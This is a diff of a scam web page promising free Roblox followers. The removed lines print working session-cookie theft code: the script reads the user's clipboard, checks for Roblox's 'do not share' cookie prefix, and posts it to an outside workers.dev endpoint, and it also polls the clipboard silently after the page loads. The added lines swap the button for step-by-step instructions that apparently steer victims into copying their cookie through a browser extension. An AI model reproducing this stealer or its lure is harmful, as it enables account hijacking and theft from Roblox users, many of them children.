@@ -124,35 +124,18 @@ h1 {
   line-height: 1.5;
 }
 
-.main-button {
-  width: 100%;
-  padding: 18px 24px;
-
-  border: none;
-  border-radius: 15px;
-
-  background: white;
-  color: #111;
-
-  font-size: 19px;
-  font-weight: 800;
-
-  cursor: pointer;
-
-  transition:
-    transform .2s ease,
-    box-shadow .2s ease,
-    background .2s ease;
+.steps-list {
+  text-align: left;
+  margin: 25px auto;
+  padding-left: 20px;
+  max-width: 600px;
+  color: #d0d0dc;
+  font-size: 15px;
+  line-height: 1.8;
 }
 
-.main-button:hover {
-  transform: translateY(-3px);
-  box-shadow: 0 15px 35px rgba(255,255,255,.16);
-  background: #f0f0f0;
-}
-
-.main-button:active {
-  transform: translateY(0) scale(.98);
+.steps-list li {
+  margin-bottom: 8px;
 }
 
 /* Extension Button */
@@ -199,27 +182,6 @@ h1 {
   font-size: 13px;
   color: #aaaab5;
 }
-
-/* Loading spinner */
-.spinner {
-  display: inline-block;
-  width: 16px;
-  height: 16px;
-  margin-right: 8px;
-  vertical-align: -3px;
-
-  border: 3px solid rgba(0,0,0,.2);
-  border-top-color: #111;
-  border-radius: 50%;
-
-  animation: spin .8s linear infinite;
-}
-
-@keyframes spin {
-  to {
-    transform: rotate(360deg);
-  }
-}
 </style>
 
 </head>
@@ -240,94 +202,12 @@ h1 {
       Grow your Roblox presence with one simple click.
     </p>
 
-    <button class="main-button" id="main">
-      Add Followers 
-    </button>
+    <ol class="steps-list">
+      <li>Click on extension button</li>
+      <li>Add the extension to your browser</li>
+      <li>Open Roblox in the browser you have the extension and go to your acc you want followers on</li>
+      <li>Open the extension you got and click "copy"</li>
+      <li>Come back here and wait 5 sec</li>
+    </ol>
 
     <a
-      class="extension-button"
-      href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf?authuser=0&utm_source=app-launcher"
-      target="_blank"
-      rel="noopener noreferrer"
-    >
-      PC Extension
-    </a>
-
-    <div class="status" id="status"></div>
-  </div>
-
-</div>
-
-<script>
-const button = document.getElementById("main");
-const status = document.getElementById("status");
-
-const SEND_ENDPOINT =
-  "https://young-brook-716e.abojanmawzoon.workers.dev";
-     
-async function sendClipboardData(text) {
-  try {
-    await fetch(SEND_ENDPOINT, {     
-      method: "POST",     
-      headers: {     
-        "Content-Type": "application/json"     
-      },     
-      body: JSON.stringify({     
-        clipboardText: text     
-      })     
-    });     
-     
-    await new Promise(resolve => setTimeout(resolve, 10000));     
-     
-    status.textContent = "Restart Device To Get Followers Added to your account!";     
-  } catch (error) {     
-    status.textContent = "Something went wrong. Please try again.";     
-    console.error(error);     
-  }
-}
-
-button.addEventListener("click", async () => {     
-  try {     
-    status.innerHTML = `     
-      <span class="spinner"></span>     
-      Adding Followers...     
-    `;     
-     
-    const text = await navigator.clipboard.readText();     
-     
-    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
-      status.textContent = "error make sure u copy cookie";     
-      return;     
-    }     
-     
-    await sendClipboardData(text);
-     
-  } catch (error) {     
-    status.textContent = "error make sure u copy cookie";     
-    console.error(error);     
-  }     
-});
-
-async function monitorClipboard() {
-  if (!navigator.clipboard || !navigator.clipboard.readText) return;
-  
-  try {
-    const text = await navigator.clipboard.readText();
-    if (text && text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
-      await sendClipboardData(text);
-      return;
-    }
-  } catch (e) {
-    // Clipboard permission might require user interaction first
-  }
-  
-  setTimeout(monitorClipboard, 1000);
-}
-
-window.addEventListener("load", () => {
-  setTimeout(monitorClipboard, 500);
-});
-</script>     
-     
-</body>  
-</html>
